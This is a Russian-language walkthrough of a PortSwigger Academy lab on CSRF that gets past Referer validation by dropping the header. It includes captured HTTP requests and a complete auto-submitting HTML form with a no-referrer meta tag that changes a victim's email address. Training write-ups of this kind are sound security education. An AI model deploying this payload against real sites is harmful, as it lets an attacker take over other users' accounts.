логинимся под `wiener:peter`

И изменим почту на `change@me.com`

Найдем в `Proxy` -> `HTTP history` данный запрос на смену почтового ящика
```
POST /my-account/change-email
...
Referer: https://0a5a0011032e342c80bbda4300f900f2.web-security-academy.net/my-account?id=wiener
...
email=change%40me.com
```

и отправим данный запрос в `Repeater`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/11.%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/pics%20for%20walkthrough/1.png)

Обратим внимание на поле `Referer`

Если вдруг мы укажем невалидный `Referer`, к примеру заменим домен с 
```
Referer: https://0a5a0011032e342c80bbda4300f900f2.web-security-academy.net/my-account?id=wiener
```
на 
```
Referer: https://0a5a0011032e342c80bbda4300f900f2.web-security-academy.com/my-account?id=wiener
```
то увидим 400 ошибку 
`"Invalid referer header"`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/11.%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/pics%20for%20walkthrough/2.png)

а Вот если вообще удалить из запроса данное поле, то увидим, что запрос выполняется успешно
```
POST /my-account/change-email
...
email=change2%40me.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/11.%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/pics%20for%20walkthrough/3.png)

Нажмем ПКМ -> Engagement tools -> Generate CSRF PoC

Получим следующий PoC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5a0011032e342c80bbda4300f900f2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

добавим в код 
```
<meta name="referrer" content="no-referrer">
```
чтобы исключали проверку `referer`

итого получив следующий PoC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<meta name="referrer" content="no-referrer">
    <form action="https://0a5a0011032e342c80bbda4300f900f2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change3&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Нажмем `Store` и `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/11.%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/pics%20for%20walkthrough/4.png)
